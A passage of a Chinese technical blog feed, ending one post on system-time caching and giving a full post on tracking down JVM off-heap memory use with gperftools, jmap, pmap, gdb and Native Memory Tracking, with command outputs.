the first indirect<br>jump goes straight into the function.</p></blockquote><p>重新使用<code>ltrace</code>查看：</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo ltrace  -c -S  -p 16365</span><br><span class="line">^C% time     seconds  usecs/call     calls      <span class="keyword">function</span></span><br><span class="line">------ ----------- ----------- --------- --------------------</span><br><span class="line"> 76.73   14.190163        1880      7544 SYS_getegid32</span><br><span class="line"> 23.27    4.303741      614820         7 SYS_madvise1</span><br><span class="line">  0.00    0.000197          24         8 SYS_exit</span><br><span class="line">------ ----------- ----------- --------- --------------------</span><br><span class="line">100.00   18.494101                  7559 total</span><br></pre></td></tr></table></figure><p>然而还是没有看到<code>gettimeofday</code>的调用，具体原因不得而知。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><blockquote><p>premature optimization is the root of all evil 过早优化是万恶之源</p></blockquote><p>如果系统的性能能满足我们的要求，就不要过早的做这些优化 ; 系统优化之前需要先做<br>profiling，找到真正的瓶颈，在次之前需要保持系统的简单，可靠。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><p><a href="http://blog.csdn.net/will_awoke/article/details/27084907" rel="external nofollow noopener noreferrer" target="_blank">SystemTimer CurrentTimeMillis 时间缓存 - CSDN 博客</a></p></li><li><p>《NIO trick and trap 》</p></li><li><p><a href="http://feiyang21687.github.io/SystemNano/" rel="external nofollow noopener noreferrer" target="_blank">System.nanoTime() 的实现分析 – 陈飞 – 码农</a></p></li><li><p><a href="http://blog.caoxudong.info/blog/2017/09/08/currentTimeMillis_in_java" rel="external nofollow noopener noreferrer" target="_blank">jdk8 中的时间获取</a></p></li><li><p><a href="http://pzemtsov.github.io/2017/07/23/the-slow-currenttimemillis.html" rel="external nofollow noopener noreferrer" target="_blank">The slow currentTimeMillis()</a></p></li><li><p><a href="http://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8185891" rel="external nofollow noopener noreferrer" target="_blank">Bug ID: JDK-8185891 System.currentTimeMillis() is slow on Linux, especially with the HPET time source</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;系统时间缓存的必要&quot;&gt;&lt;a href=&quot;#系统时间缓存的必要&quot; class=&quot;headerlink&quot; title=&quot;系统时间缓存的必要&quot;&gt;&lt;/a&gt;系统时间缓存的必要&lt;/h2&gt;&lt;img src=&quot;/2017/12/02/cache-system-time/time-
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="cache" scheme="http://qsli.github.io/tags/cache/"/>
    
  </entry>
  
  <entry>
    <title>使用google perf工具来排查堆外内存占用</title>
    <link href="http://qsli.github.io/2017/12/02/google-perf-tools/"/>
    <id>http://qsli.github.io/2017/12/02/google-perf-tools/</id>
    <published>2017-12-02T11:24:38.000Z</published>
    <updated>2018-08-11T12:42:41.519Z</updated>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>线上机器内存不足，经常被系统<code>oom killer</code>干掉。</p><p>如果<code>tomcat</code>运行的好好的，突然被干掉了，没有任何线索，那么就可以使用下面的命令看看是不是<code>oom killer</code>搞的鬼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dmesg | grep -i <span class="built_in">kill</span> | less</span><br><span class="line"></span><br><span class="line">Out of memory: Kill process 23195 (java) score 558 or sacrifice child</span><br><span class="line">Killed process 23195, UID 40001, (java) total-vm:81176732kB, anon-rss:64507900kB, file-rss:2604kB</span><br></pre></td></tr></table></figure><p>其中<code>anon-rss</code>是程序占用的物理内存，  64507900kB = 61.519527435302734 GB<br>系统总的内存也才<code>62GB</code>，linux发现没有可分配的内存，就会启用<code>oom killer</code>的机制，根据<code>oom_score_adj</code>的值去干掉相应的进程了。</p><p>系统上<code>oom_score_adj</code>的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">43722 total pagecache pages</span><br><span class="line">4335 pages in swap cache</span><br><span class="line">Swap cache stats: add 1009840, delete 1005505, find 76432470/76485037</span><br><span class="line">Free swap  = 49990420kB</span><br><span class="line">Total swap = 50331644kB</span><br><span class="line">16777215 pages RAM</span><br><span class="line">282254 pages reserved</span><br><span class="line">36481 pages shared</span><br><span class="line">16386140 pages non-shared</span><br><span class="line">[ pid ]   uid  tgid total_vm      rss cpu oom_adj oom_score_adj name</span><br><span class="line">[ 1419]     0  1419     2883       94  18     -17         -1000 udevd</span><br><span class="line">[ 2894]     0  2894     2660      105   6     -17         -1000 udevd</span><br><span class="line">[ 2895]     0  2895     2882       43   2     -17         -1000 udevd</span><br><span class="line">[  388]     0   388    16557       63  12     -17         -1000 sshd</span><br><span class="line">[ 1340]     0  1340   152806     9114   6       0             0 salt-minion</span><br><span class="line">[ 1341]     0  1341   110173     5224  22       0             0 salt-minion</span><br><span class="line">[14168]     0 14168     6899      149   6     -17         -1000 auditd</span><br></pre></td></tr></table></figure><p><code>tomcat</code>的进程占用内存最多，得分也最高 —— 558</p><h3 id="tomcat的配置"><a href="#tomcat的配置" class="headerlink" title="tomcat的配置"></a>tomcat的配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> -Xms44g -Xmx44g -server \</span><br><span class="line">-XX:+UseG1GC -XX:MaxGCPauseMillis=200 \</span><br><span class="line">-XX:InitiatingHeapOccupancyPercent=65 -XX:SurvivorRatio=8 \</span><br><span class="line">-XX:MaxTenuringThreshold=15 \</span><br><span class="line">-verbosegc -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps \</span><br><span class="line">-XX:+PrintTenuringDistribution -XX:+PrintAdaptiveSizePolicy \</span><br><span class="line">-XX:-TraceClassUnloading \</span><br><span class="line">-XX:+DisableExplicitGC</span><br></pre></td></tr></table></figure><p>jvm最大的堆只有44GB， 但是从上面的日志中看到实际占用的内存达到了62GB，几乎把整个系统的内存都吃掉了。<br>既然堆内没有问题，问题自然应该出在堆外内存的占用上。</p><h2 id="java-堆外内存"><a href="#java-堆外内存" class="headerlink" title="java 堆外内存"></a>java 堆外内存</h2><p><a href="http://lovestblog.cn/blog/2015/05/12/direct-buffer/" rel="external nofollow noopener noreferrer" target="_blank">JVM源码分析之堆外内存完全解读 - 你假笨</a> 中说道：</p><blockquote><p>对于System.gc的实现，之前写了一篇文章来重点介绍，JVM源码分析之SystemGC完全解读，它会对新生代的老生代都会进行内存回收，这样会比较彻底地回收DirectByteBuffer对象以及他们关联的堆外内存，我们dump内存发现DirectByteBuffer对象本身其实是很小的，但是它后面可能关联了一个非常大的堆外内存，因此我们通常称之为『冰山对象』，我们做ygc的时候会将新生代里的不可达的DirectByteBuffer对象及其堆外内存回收了，但是无法对old里的DirectByteBuffer对象及其堆外内存进行回收，这也是我们通常碰到的最大的问题，如果有大量的DirectByteBuffer对象移到了old，但是又一直没有做cms gc或者full gc，而只进行ygc，那么我们的物理内存可能被慢慢耗光，但是我们还不知道发生了什么，因为heap明明剩余的内存还很多(前提是我们禁用了System.gc)。</p></blockquote><p>白衣大侠也建议：</p><blockquote><p>这时，就只能靠前面提到的申请额度超限时触发的system.gc()来救场了。但这道最后的保险其实也不很好，首先它会中断整个进程，然后它让当前线程睡了整整一百毫秒，而且如果gc没在一百毫秒内完成，它仍然会无情的抛出OOM异常。还有，万一，万一大家迷信某个调优指南设置了-DisableExplicitGC禁止了system.gc()，那就不好玩了。<br>所以，堆外内存还是自己主动点回收更好，比如Netty就是这么做的。</p></blockquote><h3 id="限制堆外内存的大小"><a href="#限制堆外内存的大小" class="headerlink" title="限制堆外内存的大小"></a>限制堆外内存的大小</h3><p>加上<code>-XX:MaxDirectMemorySize=4g</code>， 去除<code>-XX:+DisableExplicitG</code>观察了几天，发现并不能解决问题，于是继续使用<code>google perf tools</code>去观察下堆外内存的使用</p><h2 id="google-perf-tools"><a href="#google-perf-tools" class="headerlink" title="google perf tools"></a>google perf tools</h2><p><a href="https://github.com/gperftools/gperftools/tree/master" rel="external nofollow noopener noreferrer" target="_blank">下载地址</a></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p>该工具主要利用了unix的一个环境变量LD_PRELOAD，它允许你要加载的动态库优先加载起来，相当于一个Hook了，<br>于是可以针对同一个函数可以选择不同的动态库里的实现了，比如googleperftools就是将malloc方法替换成了tcmalloc的实现，这样就可以跟踪内存分配路径了</p></blockquote><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>tomcat</code>的启动变量中加入下面的配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_PRELOAD=/usr/<span class="built_in">local</span>/lib/libtcmalloc.so</span><br><span class="line"><span class="built_in">export</span> HEAPPROFILE=/home/q/perf-result/</span><br><span class="line"><span class="built_in">export</span> HEAP_PROFILE_ALLOCATION_INTERVAL=2000000000</span><br></pre></td></tr></table></figure></p><p>HEAPPROFILE是存放结果的地址</p><blockquote><p>HEAP_PROFILE_ALLOCATION_INTERVAL    default: 1073741824 (1 Gb)    Dump heap profiling information once every specified number of bytes has been allocated by the program.</p></blockquote><p>查看运行中的日志:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumping heap profile to /home/q/perf-result/_23207.0927.heap (1755151 MB allocated cumulatively, 1267 MB currently in use)</span><br></pre></td></tr></table></figure></p><p>日志中会显示累计的对外内存的分配和当前使用的堆外内存的大小。</p><h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><h4 id="文本形式的"><a href="#文本形式的" class="headerlink" title="文本形式的"></a>文本形式的</h4><p>命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/bin/pprof --text /home/q/java/default/bin/java _23207.0035.heap</span><br></pre></td></tr></table></figure></p><p>输出结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Using local file /home/q/java/default/bin/java.</span><br><span class="line">Using local file _23207.1012.heap.</span><br><span class="line">Total: 1283.1 MB</span><br><span class="line"></span><br><span class="line">     0.0   0.0% 100.0%     39.5   3.1% PtrQueue::enqueue_known_active</span><br><span class="line">     0.0   0.0% 100.0%     39.5   3.1% PtrQueueSet::allocate_buffer</span><br><span class="line">     0.0   0.0% 100.0%     42.2   3.3% G1ParTask::work</span><br><span class="line">     0.0   0.0% 100.0%     42.2   3.3% GangWorker::loop</span><br><span class="line">     0.0   0.0% 100.0%     75.6   5.9% ObjArrayKlass::oop_oop_iterate_nv_m@8fbe80</span><br><span class="line">     0.0   0.0% 100.0%    146.2  11.4% 0x00007f63bf0e5825</span><br><span class="line">     0.0   0.0% 100.0%    146.2  11.4% JVM_InternString</span><br><span class="line">     0.0   0.0% 100.0%    146.2  11.4% StringTable::intern@a24ca0</span><br><span class="line">     0.0   0.0% 100.0%    147.2  11.5% StringTable::basic_add</span><br><span class="line">     0.0   0.0% 100.0%    147.3  11.5% StringTable::intern@a24780</span><br><span class="line">     0.0   0.0% 100.0%    152.4  11.9% Hashtable::new_entry</span><br><span class="line">     0.0   0.0% 100.0%    170.5  13.3% AllocateHeap</span><br><span class="line">     0.0   0.0% 100.0%    256.0  20.0% ConcurrentMark::ConcurrentMark</span><br><span class="line">     0.0   0.0% 100.0%    265.5  20.7% InstanceKlass::oop_oop_iterate_nv</span><br><span class="line">     0.0   0.0% 100.0%    287.2  22.4% G1CollectedHeap::initialize</span><br><span class="line">     0.0   0.0% 100.0%    305.4  23.8% Universe::initialize_heap</span><br><span class="line">     0.0   0.0% 100.0%    306.3  23.9% universe_init</span><br><span class="line">     0.0   0.0% 100.0%    307.0  23.9% init_globals</span><br><span class="line">     0.0   0.0% 100.0%    307.1  23.9% JNI_CreateJavaVM</span><br><span class="line">     0.0   0.0% 100.0%    307.1  23.9% Threads::create_vm</span><br><span class="line">     0.0   0.0% 100.0%    307.2  23.9% JavaMain</span><br><span class="line">     0.0   0.0% 100.0%    326.5  25.4% ConcurrentG1RefineThread::run</span><br><span class="line">     0.0   0.0% 100.0%    326.5  25.4% RefineCardTableEntryClosure::do_card_ptr</span><br><span class="line">     0.0   0.0% 100.0%    329.8  25.7% 0x00007f63bfae74a7</span><br><span class="line">     0.0   0.0% 100.0%    348.5  27.2% DirtyCardQueueSet::apply_closure_to_completed_buffer</span><br><span class="line">     0.0   0.0% 100.0%    349.7  27.3% G1RemSet::refine_card</span><br><span class="line">     0.0   0.0% 100.0%    349.7  27.3% HeapRegion::oops_on_card_seq_iterate_careful</span><br><span class="line">     0.0   0.0% 100.0%    349.7  27.3% OtherRegionsTable::add_reference</span><br><span class="line">     0.0   0.0% 100.0%    351.0  27.4% os::malloc@913e80</span><br><span class="line">     0.0   0.0% 100.0%    351.0  27.4% Unsafe_AllocateMemory</span><br><span class="line">     0.0   0.0% 100.0%    408.4  31.8% java_start</span><br><span class="line">     0.0   0.0% 100.0%    562.6  43.8% BitMap::resize</span><br><span class="line">     0.0   0.0% 100.0%    598.5  46.6% ArrayAllocator::allocate</span><br><span class="line">     0.0   0.0% 100.0%    715.5  55.8% __clone</span><br><span class="line">     0.0   0.0% 100.0%    715.5  55.8% start_thread</span><br><span class="line">  1277.3  99.5%  99.5%   1277.3  99.5% os::malloc@9137e0</span><br></pre></td></tr></table></figure><p>结果代表的含义:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Analyzing Text Output</span><br><span class="line"></span><br><span class="line">Text mode has lines of output that look like this:</span><br><span class="line"></span><br><span class="line">       14   2.1%  17.2%       58   8.7% std::_Rb_tree::find</span><br><span class="line">Here is how to interpret the columns:</span><br><span class="line"></span><br><span class="line">1. Number of profiling samples in this function</span><br><span class="line">2. Percentage of profiling samples in this function</span><br><span class="line">3. Percentage of profiling samples in the functions printed so far</span><br><span class="line">4. Number of profiling samples in this function and its callees</span><br><span class="line">5. Percentage of profiling samples in this function and its callees</span><br><span class="line">6. Function name</span><br></pre></td></tr></table></figure><p><a href="https://gperftools.github.io/gperftools/cpuprofile.html" rel="external nofollow noopener noreferrer" target="_blank">Gperftools CPU Profiler</a>中有更加详细的说明</p><h4 id="pdf形式的结果"><a href="#pdf形式的结果" class="headerlink" title="pdf形式的结果"></a>pdf形式的结果</h4><p>相比文字的结果，图片形式的调用关系，更加清楚和直观。</p><p>命令如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install ghostscript</span><br><span class="line">sudo yum install dot</span><br><span class="line">sudo yum install graphviz -y</span><br><span class="line">sudo pprof --pdf  /home/q/java/default/bin/java _19877.19793.heap &gt; result.pdf</span><br></pre></td></tr></table></figure><p>结果：</p><div class="row">    <embed src="result.pdf" width="100%" height="550" type="application/pdf"></div><h2 id="可能的原因"><a href="#可能的原因" class="headerlink" title="可能的原因"></a>可能的原因</h2><p>从google perf tools的结果来看主要的堆外内存来自</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00007f52e05126a5</span><br><span class="line">0.0 (0.0%)</span><br><span class="line">of 7089.3 (82.5%)</span><br></pre></td></tr></table></figure><p>这个再往上就没有地址了。</p><h3 id="heap-占用"><a href="#heap-占用" class="headerlink" title="heap 占用"></a>heap 占用</h3><p>查看出问题机器的<code>heap</code>占用情况如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">jmap -histo:live `pgrep -f &apos;tomcat&apos;`</span><br><span class="line"></span><br><span class="line"> num     #instances         #bytes  class name</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line"></span><br><span class="line">   1:      15272979      940261992  [C</span><br><span class="line"></span><br><span class="line">   2:      19182959      767318360  java.util.ArrayList</span><br><span class="line"></span><br><span class="line">   3:      15397474      739078752  qunar.tc.plato.zeno.util.collections.offheap.map.OffHeapHashMap</span><br><span class="line"></span><br><span class="line">   4:      13281544      637514112  java.util.concurrent.ConcurrentHashMap$Node</span><br><span class="line"></span><br><span class="line">   5:      10136730      612997544  [Ljava.lang.Object;</span><br><span class="line"></span><br><span class="line">   6:      15265576      488498432  java.lang.String</span><br><span class="line"></span><br><span class="line">   7:       4694324      413100512  _plato.com.qunar.hotel.price.data.center.plato.beans.shotel.IMetaSHotelBizInfo</span><br><span class="line"></span><br><span class="line">   8:           854      379525944  [Ljava.util.concurrent.ConcurrentHashMap$Node;</span><br><span class="line"></span><br><span class="line">   9:      15397474      369539376  qunar.tc.plato.zeno.util.collections.offheap.set.OffHeapHashSet</span><br><span class="line"></span><br><span class="line">  10:       4694324      337991328  _plato.com.qunar.hotel.price.data.center.plato.beans.shotel.IMetaContactConfig</span><br></pre></td></tr></table></figure><p>前面的都是去哪儿自己开发的堆外缓存占用的对象，缓存的内容也多是酒店相关的元数据。结合工具的结果，推测问题出在堆外缓存。<br>堆外缓存采用的是内存映射的方式，大量使用了<code>DirectByteBuffer</code>这种冰山对象。</p><h3 id="疑点"><a href="#疑点" class="headerlink" title="疑点"></a>疑点</h3><p>这个系统目前处于重构阶段，之前也是使用的堆外缓存，并没有出现问题。不过，目前在逐渐下掉堆外缓存的使用，到时候可以再看看是否出问题。</p><h2 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h2><h3 id="使用pmap查看进程的内存映射"><a href="#使用pmap查看进程的内存映射" class="headerlink" title="使用pmap查看进程的内存映射"></a>使用pmap查看进程的内存映射</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat pmap -x  25147 | less</span><br><span class="line"></span><br><span class="line">Address           Kbytes     RSS   Dirty Mode   Mapping</span><br><span class="line">0000000000400000       4       0       0 r-x--  java</span><br><span class="line">0000000000600000       4       4       4 rw---  java</span><br><span class="line">0000000001d3f000    1484    1224    1224 rw---    [ anon ]</span><br><span class="line">0000003e0a400000     128     112       0 r-x--  ld-2.12.so</span><br><span class="line">0000003e0a61f000       4       4       4 r----  ld-2.12.so</span><br><span class="line">0000003e0a620000       4       4       4 rw---  ld-2.12.so</span><br><span class="line">0000003e0a621000       4       4       4 rw---    [ anon ]</span><br><span class="line">0000003e0a800000       8       8       0 r-x--  libdl-2.12.so</span><br><span class="line">0000003e0a802000    2048       0       0 -----  libdl-2.12.so</span><br><span class="line">0000003e0aa02000       4       4       4 r----  libdl-2.12.so</span><br><span class="line">0000003e0aa03000       4       4       4 rw---  libdl-2.12.so</span><br><span class="line">0000003e0ac00000    1576     680       0 r-x--  libc-2.12.so</span><br><span class="line">0000003e0ad8a000    2048       0       0 -----  libc-2.12.so</span><br><span class="line">0000003e0af8a000      16      16       8 r----  libc-2.12.so</span><br><span class="line">0000003e0af8e000       4       4       4 rw---  libc-2.12.so</span><br><span class="line">0000003e0af8f000      20      20      20 rw---    [ anon ]</span><br><span class="line">0000003e0b000000      92      72       0 r-x--  libpthread-2.12.so</span><br><span class="line">0000003e0b017000    2048       0       0 -----  libpthread-2.12.so</span><br><span class="line">0000003e0b217000       4       4       4 r----  libpthread-2.12.so</span><br><span class="line">0000003e0b218000       4       4       4 rw---  libpthread-2.12.so</span><br><span class="line">0000003e0b219000      16       4       4 rw---    [ anon ]</span><br></pre></td></tr></table></figure><p>将内存块的内容dump成文件（慎重，会影响服务）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  gdb --batch --pid 25147 -ex &quot; dump memory /home/qisheng.li/c.dump 0x00007eefcc000000 0x00007eefcf000000&quot;</span><br></pre></td></tr></table></figure></p><p>查看文件的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx.h.cn2 ~]$ view c.dump</span><br></pre></td></tr></table></figure><p>这个dump是我在<code>2017年 09月 05日 星期二 01:34:24 CST</code>做的，但是内容看起来是tomcat respone的内容，奇怪的是内容的时间是<code>2017 17:38:18 GMT</code>，不知道是什么原因导致的，如果你知道，烦请告知。</p><p>直接查看堆外的内存块，无疑是最快排查堆外占用的方法，但是内存块的选择非常依赖经验， 我尝试了下，并没有找到问题。</p><p><code>参考5</code>中的大神，通过dump内存块，发现是netty使用的<code>directBuffer</code>分配的大量64M的内存块。</p><h4 id="JDK8中的-Native-Memory-Tracker"><a href="#JDK8中的-Native-Memory-Tracker" class="headerlink" title="JDK8中的 Native Memory Tracker"></a>JDK8中的 Native Memory Tracker</h4><p>在启动参数中开启：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:NativeMemoryTracking=[off | summary | detail]</span><br></pre></td></tr></table></figure></p><p>也可以在jvm退出的时候，打印相关的统计信息</p><blockquote><p>NMT at VM Exit<br>Use the following VM diagnostic command line option to obtain last memory usage data at VM exit when Native Memory Tracking is enabled. The level of detail is based on tracking level.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+UnlockDiagnosticVMOptions -XX:+PrintNMTStatistics</span><br></pre></td></tr></table></figure></p></blockquote><p>在程序运行时可以使用<code>jcmd</code>查看内存的分配情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jcmd &lt;pid&gt; VM.native_memory [summary | detail | baseline | summary.diff | detail.diff | shutdown] [scale= KB | MB | GB]</span><br></pre></td></tr></table></figure></p><p>输出的结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo -u tomcat jcmd `pgrep -f tomcat` VM.native_memory detail</span><br><span class="line">31549:</span><br><span class="line"></span><br><span class="line">Native Memory Tracking:</span><br><span class="line"></span><br><span class="line">Total: reserved=50215227KB, committed=49947839KB</span><br><span class="line">-                 Java Heap (reserved=46137344KB, committed=46137344KB)</span><br><span class="line">                            (mmap: reserved=46137344KB, committed=46137344KB) </span><br><span class="line"> </span><br><span class="line">-                     Class (reserved=92639KB, committed=91707KB)</span><br><span class="line">                            (classes #14958)</span><br><span class="line">                            (malloc=2527KB #50184) </span><br><span class="line">                            (mmap: reserved=90112KB, committed=89180KB) </span><br><span class="line"> </span><br><span class="line">-                    Thread (reserved=914804KB, committed=914804KB)</span><br><span class="line">                            (thread #883)</span><br><span class="line">                            (stack: reserved=906696KB, committed=906696KB)</span><br><span class="line">                            (malloc=2904KB #4435) </span><br><span class="line">                            (arena=5203KB #1764)</span><br><span class="line"> </span><br><span class="line">-                      Code (reserved=263567KB, committed=87223KB)</span><br><span class="line">                            (malloc=13967KB #19565) </span><br><span class="line">                            (mmap: reserved=249600KB, committed=73256KB) </span><br><span class="line"> </span><br><span class="line">-                        GC (reserved=1849937KB, committed=1849937KB)</span><br><span class="line">                            (malloc=105041KB #121050) </span><br><span class="line">                            (mmap: reserved=1744896KB, committed=1744896KB) </span><br><span class="line"> </span><br><span class="line">-                  Compiler (reserved=13354KB, committed=13354KB)</span><br><span class="line">                            (malloc=3061KB #3484) </span><br><span class="line">                            (arena=10292KB #13)</span><br><span class="line"> </span><br><span class="line">-                  Internal (reserved=813935KB, committed=813935KB)</span><br><span class="line">                            (malloc=813903KB #102254) </span><br><span class="line">                            (mmap: reserved=32KB, committed=32KB) </span><br><span class="line"> </span><br><span class="line">-                    Symbol (reserved=18071KB, committed=18071KB)</span><br><span class="line">                            (malloc=14355KB #138545) </span><br><span class="line">                            (arena=3716KB #1)</span><br><span class="line"> </span><br><span class="line">-    Native Memory Tracking (reserved=7274KB, committed=7274KB)</span><br><span class="line">                            (malloc=298KB #4295) </span><br><span class="line">                            (tracking overhead=6976KB)</span><br><span class="line"> </span><br><span class="line">-               Arena Chunk (reserved=14191KB, committed=14191KB)</span><br><span class="line">                            (malloc=14191KB) </span><br><span class="line"> </span><br><span class="line">-                   Unknown (reserved=90112KB, committed=0KB)</span><br><span class="line">                            (mmap: reserved=90112KB, committed=0KB) </span><br><span class="line"> </span><br><span class="line">Virtual memory map:</span><br><span class="line"> </span><br><span class="line">[0x00007ef481693000 - 0x00007ef481794000] reserved and committed 1028KB for Thread Stack from</span><br><span class="line">    [0x00007f0486546f74] JavaThread::run()+0x24</span><br><span class="line">    [0x00007f04863fab88] java_start(Thread*)+0x108</span><br><span class="line"> </span><br><span class="line">[0x00007ef481794000 - 